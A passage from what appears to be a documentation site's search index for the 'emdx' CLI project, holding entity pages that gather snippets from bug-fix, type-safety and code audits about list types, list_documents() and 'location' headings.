\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>project plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>project mapping</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/list/","title":"list","text":"<p>Type: tech_term | Mentioned in: 20 documents | First seen: 2025-07-07</p>"},{"location":"entities/list/#documents-20","title":"Documents (20)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>...-527)** The full \"Document Groups\" section documents <code>emdx group create/add/remove/list/show/edit/delete</code> commands. None of these exist. The <code>group</code> subcommand is not registered in <code>main.py</code>. The <code>commands/groups.py</code> file doesn't exist, `database/groups...</p> </li> <li> <p>#6839 Delegate: list   Section: Summary</p> <p>The working copy contains two fixes that resolve <code>emdx delegate list</code> (and other delegate subcommands) being broken:</p> </li> <li> <p>#6838 Delegate: list [1/3]</p> <p>Now I see the pattern clearly. The user is testing <code>emdx delegate \"list\" \"--limit\" \"3\"</code> (or similar) \u2014 passing subcommand names as task prompts. This is the bug where subcommand names get swallowed as task arguments because of `invoke_wi...</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>Problem: <code>emdx delegate list</code> (and other subcommands like <code>running</code>, <code>stats</code>, <code>show</code>, etc.) were being treated as task prompts instead of routing to their subcommands. This is because Typer's `i...</p> </li> <li> <p>#6835 Delegate: list   Section: Summary</p> <p>Bug found and already fixed on disk: <code>emdx delegate list</code> (and all other delegate subcommands) was broken due to a <code>NameError: name 'click' is not defined</code> on line 1208 of <code>delegate.py</code>.</p> </li> <li> <p>#6836 Delegate: list   Section: Summary</p> <p>The <code>emdx delegate</code> command now supports subcommands (<code>list</code>, <code>running</code>, <code>stats</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code>, <code>killall</code>, <code>health</code>, <code>monitor</code>) that were previously only accessible via <code>emdx exec</code> (now folded into delegate).</p> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <p>...a variadic positional <code>[TASKS]...</code> argument would swallow subcommand names (e.g., <code>list</code>, <code>show</code>, <code>kill</code>) as task arguments. The routing detects when the first argument matches a registered subcommand and re-invokes it through Click's machinery.</p> </li> <li> <p>#6825 Delegate: --help [2/2]</p> <p>I see \u2014 the task prompt is literally <code>--help</code>. This was dispatched as part of a parallel delegate call with two tasks: <code>list</code> and <code>--help</code>. The delegate system dispatched <code>--help</code> as a task prompt to a Claude agent.</p> </li> <li> <p>#6746 Delegate: Research Obsidian community plugins for auto-linking and kno [5/5]   Section: 2. Dataview Plugin</p> <p>Query capabilities:</p> </li> <li><code>LIST</code>, <code>TABLE</code>, <code>TASK</code>, <code>CALENDAR</code> output types</li> <li>Filter by tags, frontmatter fields, links, dates</li> <li>Sort, group, flatten results</li> <li> <p>Implicit fields available without explicit metadata (file name, creation date, tags, links)</p> </li> <li> <p>#6598 Delegate synthesis [synthesis]   Section: Executive Summary</p> <p>...README as sales document \u2014 Lead with the AI-native differentiator, not feature lists</p> </li> <li> <p>#6405 Bug Fix PR Reviews [4/6]   Section: Detailed Review</p> <p>...s, projects, tags, timestamps)</p> </li> <li>Proper handling of type conversions:</li> <li><code>set</code> \u2192 <code>list</code> for JSON serialization</li> <li><code>datetime</code> \u2192 ISO string format</li> <li> <p><code>list</code> \u2192 <code>set</code> on restore</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...core.py | 875 | ESSENTIAL - CRUD operations (save, view, edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | VALUABLE** - Work queue for Claude sessions. Simple, focused, integrates well with deleg...</p> </li> <li> <p>#6374 Codebase Bug Audit 2026-02-15 [2/10]   Section: Low Severity Bugs</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>...cade/cascade_browser.py: removed <code>update_cascade_stage</code></p> </li> <li>emdx/ui/cascade/document_list.py: removed <code>get_document_pr_url</code></li> <li>emdx/ui/command_palette/palette_commands.py: removed <code>Any</code></li> <li> <p>emdx/ui/command_palette/palette_presenter.py: removed `CommandRegist...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...vance\u2192runs | | <code>commands/executions.py</code> | \ud83d\udd34 CRITICAL | 10 public functions | Test <code>list_executions</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code> | | <code>commands/gist.py</code> | \ud83d\udd34 CRITICAL | 6 public functions | Test <code>create</code>, <code>update</code>, <code>copy_to_clipboard</code>, auth flow | | `c...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...<code>,</code>DEFAULT_BATCH_LIMIT<code>,</code>DEFAULT_BROWSE_LIMIT<code>,</code>DEFAULT_CLAUDE_MODEL<code>,</code>DEFAULT_LIST_LIMIT<code>,</code>DEFAULT_MAX_AGENT_ITERATIONS<code>,</code>DEFAULT_MAX_CONCURRENT_STAGES<code>,</code>DEFAULT_MAX_CONTEXT_DOCS<code>,</code>DEFAULT_MAX_SUGGESTIONS<code>,</code>DEFAULT_MAX_TAGS_PER_DOC<code>,</code>DEFAULT_...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Problem</p> <p>...subcommands. The result:</p> </li> <li>49 zombie \"active\" delegate task records pollute <code>task list</code></li> <li>0 open tasks in the manual queue (nobody uses it)</li> <li>The API is too complex for agents (dependency DAG, 5-level priority, task log, etc.)</li> <li> <p><code>task_executions</code> table...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li><code>-s, --status STR</code>: Filter by status (comma-separated)</li> <li><code>-g, --gameplan INT</code>: Filter by gameplan</li> <li><code>--project STR</code>: Filter by project</li> <li> <p><code>-n, --limit INT</code>: Max results (default: 50)</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83d\udcca Feature Comparison Matrix</p> <p>...| \u274c | \u274c | | view | \u2705 By ID/title/project | \u2705 Inherits | \u274c | \u2705 By ID/name | | list | \u2705 All docs | \u274c | \u274c | \u2705 All docs | | recent | \u2705 By access time | \u2705 Inherits | \u274c | \u2705 By date | | stats | \u2705 Basic stats | \u274c | \u274c | \u2705 Basic stats | | clip...</p> </li> </ul>"},{"location":"entities/list/#14-browsepy23-function-name-list-shadows-builtin","title":"14. browse.py:23 \u2014 Function name <code>list</code> shadows builtin","text":"<p>File: browse.py Line: 18 Issue: <code>def list(...)</code> shadows the Python builtin <code>list</code>. Impact: Cannot use builtin <code>list()</code> in this function scope.</p>"},{"location":"entities/list/#7-task-model-returns-untyped-dicts-throughout","title":"7. Task model returns untyped dicts throughout","text":"<p>File: <code>emdx/models/tasks.py:63-322</code> Issue: All functions return <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code> - no TypedDict for task structure Severity: CRITICAL</p>"},{"location":"entities/list/#2-list-list-tasks","title":"2. <code>list</code> \u2014 List tasks","text":"<p>Options:</p>"},{"location":"entities/list/#related-entities","title":"Related Entities","text":"<ul> <li><code>tasks[0]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>logs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>vertical</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>monitor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>logbrowserhost</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>killall</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx delegate list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>invoke_without_command=true</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>kill</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>update_cascade_stage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/listany/","title":"list[any]","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-01-10</p>"},{"location":"entities/listany/#documents-9","title":"Documents (9)","text":"<ul> <li>#6518 Any removal Phase 1: Quick wins   Section: 2. Fixed <code>list[Any]</code> SQL params in <code>ask_service.py</code> <p>Changed three <code>list[Any]</code> type annotations to <code>list[str | int]</code> for SQL query parameters:</p> </li> <li>Line 146: <code>params: list[str | int] = [f\"%{ticket}%\"]</code></li> <li>Line 168: <code>params: list[str | int] = [terms]</code></li> <li> <p>Line 193: <code>fallback_params: list[str | int] = []</code></p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority</p> </li> <li><code>emdx/services/unified_search.py</code> (line 364: <code>list[Any]</code> \u2192 <code>list[SemanticMatch]</code>)</li> <li><code>emdx/services/embedding_service.py</code> (line 30: <code>-&gt; Any</code> \u2192 <code>-&gt; SentenceTransformer</code>)</li> <li> <p><code>emdx/ui/activity/activity_items.py</code> (8 occurrences...</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Priority Implementation Order</p> </li> <li>Replace all <code>**kwargs: Any</code> with <code>**kwargs: object</code> in <code>__init__</code> methods</li> <li>Replace SQL param <code>list[Any]</code> with <code>list[str | int]</code> in ask_service.py</li> <li> <p>Type lazy-loaded services with <code>TYPE_CHECKING</code> guards</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: 5. <code>params</code> variable in <code>_retrieve_keyword</code> (Line 146)</p> <p>Current:</p> </li> </ul> <pre><code>params: list[Any] = [f\"%{ticket}%\"]\n</code></pre> <ul> <li>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/ask_service.py</code> </li> </ul> <pre><code>params: list[Any] = [f\"%{ticket}%\"]\n</code></pre> <ul> <li> <p>#6433 Any/None typing audit [2/5]   Section: tags.py</p> Location Usage Replaceable? Suggested Replacement Line 294 <code>params: list[Any]</code> SQL parameter list containing strings and int \u2705 Yes <code>list[str \\| int]</code> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/services/unified_search.py</p> </li> <li>Location: Line 364</li> <li>Current Type: <code>list[Any]</code></li> <li>Actual Type: <code>list[SemanticMatch]</code></li> <li> <p>Rationale: Called with results from `EmbeddingService.searc...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: <code>Any</code> Type Usage</p> Pattern Count Risk Level <code>List[Any]</code> field in dataclasses 3 Medium <code>-&gt; Any</code> return types 4 High <code>get(key) -&gt; Any</code> methods 3 Medium </li> </ul>"},{"location":"entities/listany/#must-fix-breaks-type-safety","title":"Must Fix (breaks type safety)","text":""},{"location":"entities/listany/#phase-1-quick-wins-1-2-hours","title":"Phase 1: Quick Wins (1-2 hours)","text":""},{"location":"entities/listany/#5-line-146-sql-query-params-list","title":"5. Line 146: SQL Query Params List","text":""},{"location":"entities/listany/#5-_convert_semantic_matchesmatches-listany","title":"5. <code>_convert_semantic_matches(matches: list[Any])</code>","text":""},{"location":"entities/listany/#related-entities","title":"Related Entities","text":"<ul> <li><code>filesystemevent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.6)</li> <li><code>on_modified</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>update functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>matches</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>logbrowserhost.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>logbrowser.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.2)</li> </ul>"},{"location":"entities/listdictstr-any/","title":"list[dict[str, any]]","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/listdictstr-any/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...SE | 12 | <code>summary fixed</code>, <code>summary added</code> | | TYPE_ANNOT | 8 | <code>dict[str, any]</code>, <code>list[dict[str, any]]</code> |</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 5. <code>search/search_presenter.py:155</code> \u2014 <code>_load_initial_data_sync() -&gt; tuple[Any, list[dict[str, Any]]]</code></p> <p>The first element is a list of <code>SearchResult</code> objects from <code>UnifiedSearchService.get_recent_documents()</code>. The second is <code>list[dict[str, Any]]</code> for popular tags (this one is acceptable since the tag dict shape varies).</p> </li> <li> <p>#6524 Delegate: FEAT-5 Smart Priming Implementation   Section: Bug Fixes</p> <p>...py type error)</p> </li> <li>Added proper type annotation to <code>_get_stale_docs()</code> return type: <code>list[dict[str, Any]]</code></li> <li> <p>Added <code># mypy: disable-error-code=\"no-untyped-def\"</code> to test file for pre-existing type annotation issues</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/compact.py</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: activity/group_picker.py</p> <p>...args: Any, *kwargs: Any<code>| \u274c No | Widget passthrough | |</code>self.groups<code>| L116 |</code>list[dict[str, Any]]<code>| \u2705 Yes |</code>list[GroupRow]<code>(TypedDict) | |</code>self.filtered_groups<code>| L117 |</code>list[dict[str, Any]]<code>| \u2705 Yes |</code>list[GroupRow]` |</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: cascade_service.py</p> <p>...----------|----------------------| | <code>get_orphaned_cascade_executions()</code> | Return <code>list[dict[str, Any]]</code> | \u2705 Yes | <code>list[OrphanedExecutionRow]</code> TypedDict | | <code>monitor_execution_completion()</code> | Params <code>doc: dict</code>, <code>next_stage_map: dict</code>, <code>save_doc: Callable</code> | \u26a0\ufe0f Partia...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Executive Summary</p> <p>...<code>emdx/models/</code> and <code>emdx/database/</code> that return loosely-typed <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code>. These can be replaced with concrete TypedDict definitions to improve type safety, IDE autocompletion, and code maintainability.</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/services/unified_search.py</p> </li> <li>Location: Line 518</li> <li>Current Type: <code>list[dict[str, Any]]</code></li> <li>Actual Type: Create TypedDict <code>TagCount</code> with fields: <code>name: str, count: int</code></li> <li> <p>**Rational...</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]</p> </li> </ul>"},{"location":"entities/listdictstr-any/#1-_fetch_all_documents-listdictstr-any","title":"1. <code>_fetch_all_documents() -&gt; list[dict[str, Any]]</code>","text":"<p>Line 41</p>"},{"location":"entities/listdictstr-any/#7-get_popular_tags-listdictstr-any","title":"7. <code>get_popular_tags(...) -&gt; list[dict[str, Any]]</code>","text":""},{"location":"entities/listdictstr-any/#type-system-audit-emdxdatabase-module","title":"Type System Audit: emdx/database/ Module","text":""},{"location":"entities/listdictstr-any/#functions-returning-dictstr-any-listdictstr-any-or-tupleany","title":"Functions Returning <code>dict[str, Any]</code>, <code>list[dict[str, Any]]</code>, or <code>tuple[Any, ...]</code>","text":"<ul> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]   Section: Summary</p> <p>Audited all functions in <code>emdx/models/</code> that return <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code>. Found 15 functions that could benefit from TypedDict or dataclass replacements.</p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Could use TypedDict or more specific types</p> <p>...ny]<code>on dataclass | |</code>emdx/ui/cascade/cascade_view.py:95,101<code>| Pipeline data as</code>List[Dict[str, Any]]` |</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> </ul>"},{"location":"entities/listdictstr-any/#7-task-model-returns-untyped-dicts-throughout","title":"7. Task model returns untyped dicts throughout","text":"<p>File: <code>emdx/models/tasks.py:63-322</code> Issue: All functions return <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code> - no TypedDict for task structure Severity: CRITICAL</p>"},{"location":"entities/listdictstr-any/#related-entities","title":"Related Entities","text":"<ul> <li><code>create a</code>types.py<code>module</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>use</code>from future import annotations`` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>unpack[typeddict]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type safety debt audit - emdx project</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>optional[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>mergestrategy.preserve_metadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>mergemetadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type system audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>search/search_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>parse_stream_line()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/listdocuments/","title":"list_documents()","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/listdocuments/#documents-8","title":"Documents (8)","text":"<ul> <li>#6844 Delegate: ARCH-9 (Issue #1240): Filter emdx find by doc_type. Default  [1/2] <p>...use filtering</p> </li> <li><code>emdx/database/documents.py</code> \u2014 Added <code>doc_type</code> parameter to <code>list_documents()</code> and <code>get_recent_documents()</code></li> <li> <p><code>emdx/commands/core.py</code> \u2014 Added <code>--wiki</code> and <code>--all-types</code> CLI flags to <code>find</code> command, threaded <code>doc_type</code> through all search p...</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: Conclusion</p> <ul> <li>Retry wraps <code>execute()</code></li> </ul> </li> <li>Budgets read <code>ExecutionResult.cost_usd</code></li> <li>Memory injects from <code>list_documents()</code></li> <li>Gates run subprocess before PR instruction</li> <li> <p>Recipes serialize delegate invocations</p> </li> <li> <p>#6505 None Type Analysis [3/7]   Section: Function Parameters with <code>| None</code></p> <p>...int | None = None<code>| \u2705 NECESSARY | Nullable SQL column (</code>parent_id INTEGER<code>) | |</code>list_documents()<code>L126 |</code>project: str | None = None<code>| \u2705 NECESSARY | Filter parameter, None = no filter | |</code>list_documents()<code>L128 |</code>parent_id: int | None = None` | \u2705 NECESSARY...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: documents.py (12 functions)</p> <p>...ype | |----------|---------------| | <code>get_document()</code> | <code>DocumentRow \\| None</code> | | <code>list_documents()</code> | <code>list[DocumentListItem]</code> | | <code>get_recent_documents()</code> | <code>list[RecentDocumentItem]</code> | | <code>get_stats()</code> | <code>DatabaseStats</code> | | <code>list_deleted_documents()</code> | `list[Dele...</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Functions and Their New Return Types</p> <p>...type) | | <code>get_document()</code> | <code>dict[str, Any] \\| None</code> | <code>DocumentRow \\| None</code> | | <code>list_documents()</code> | <code>list[dict[str, Any]]</code> | <code>list[DocumentListItem]</code> | | <code>get_recent_documents()</code> | <code>list[dict[str, Any]]</code> | <code>list[RecentDocumentItem]</code> | | <code>get_stats()</code> | `dict[str...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> </li> <li><code>list_documents()</code>: Validates limit/offset &gt;= 0 with ValueError</li> <li> <p><code>cleanup_old_executions()</code>: Validates days &gt; 0 with ValueError</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> </li> <li><code>documents.py</code>: <code>list_documents()</code> validates limit &gt;= 0, offset &gt;= 0</li> <li> <p><code>executions.py</code>: <code>cleanup_old_executions()</code> validates days &gt; 0</p> </li> <li> <p>#460 EMDX Slimdown Analysis: Code Reduction Opportunities   Section: 3. Overlapping Functionality</p> </li> <li><code>list_documents()</code> and <code>projects()</code> have overlapping queries</li> <li>Similar table formatting code duplicated</li> </ul>"},{"location":"entities/listdocuments/#3-input-validation-good","title":"3. Input Validation - \u2705 GOOD","text":""},{"location":"entities/listdocuments/#task-626-input-validation-for-paginationdate-params","title":"Task #626: Input Validation for Pagination/Date Params","text":""},{"location":"entities/listdocuments/#browse-functions","title":"Browse Functions","text":""},{"location":"entities/listdocuments/#related-entities","title":"Related Entities","text":"<ul> <li><code>list_deleted_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>use</code>from future import annotations`` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list_recent_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[searchresult]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[recentdocumentitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[documentrow]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[documentlistitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[deleteddocumentitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list[childdocumentitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>search_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/location/","title":"location","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2025-07-07</p>"},{"location":"entities/location/#documents-12","title":"Documents (12)","text":"<ul> <li>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Vulnerability Details </li> <li>File: <code>emdx/commands/delegate.py</code></li> <li>Function: <code>_run_discovery()</code> (line 141-166)</li> <li> <p>Severity: HIGH/CRITICAL</p> </li> <li> <p>#185 MCP-SETUP-GUIDE   Section: Gmail MCP Setup</p> </li> </ul> <pre><code>\n- **#32** Claude Document Templates Quick Reference\n  *Section: For Implementations*\n  &gt; ## Location\n- Files: path/to/files\n- Key functions: function_name()\n\n- **#36** Claude Document Template System\n  *Section: Standard Document Format*\n  &gt; ## Implementation Details\n- **Location**: core/filename.fish\n- **Dependencies**: List any requirements\n- **Testing**: How to verify it works\n\n- **#6543** Delegate Enhancement Gameplans [2/5]\n  *Section: 1. CLI Flag Definition*\n  &gt; **Location**: Add after line 965 (after `cleanup` option, before the docstring ends).\n\n- **#6418** Type System Audit: Replace Any/None with Concrete Types [3/4]\n  *Section: emdx/services/file_watcher.py*\n  &gt; ### 1. `FileWatcher.observer: Any = None`\n- **Location**: Line 26\n- **Current Type**: `Any`\n- **Actual Type**: `watchdog.observers.Observer | None`\n- **Rationale**: The observer is a watchdog Observer instance when using...\n\n- **#6310** Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]\n  *Section: 1. GLOBAL STATE: Database Singleton*\n  &gt; **Location**: `database/connection.py:69`\n```python\ndb_connection = DatabaseConnection()\n</code></pre> <ul> <li>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found </li> <li>Location: <code>emdx/commands/delegate.py:246-247</code></li> <li> <p>Problem: When delegate finishes, it updates <code>task.output_doc_id</code> but NEVER updates <code>execution.doc_id</code>. The execution rec...</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> 